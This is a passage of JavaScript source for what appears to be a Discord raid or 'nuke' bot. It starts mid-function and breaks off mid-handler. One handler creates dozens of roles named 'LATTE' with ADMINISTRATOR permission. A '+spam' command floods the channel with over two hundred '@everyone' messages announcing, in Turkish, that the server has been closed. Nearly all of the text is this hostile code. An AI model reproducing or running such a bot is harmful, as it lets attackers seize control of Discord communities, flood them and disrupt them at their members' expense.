      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });

    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "LATTE",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });


      
  }
});

client.on('message', msg => {
  if (msg.content === '+spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
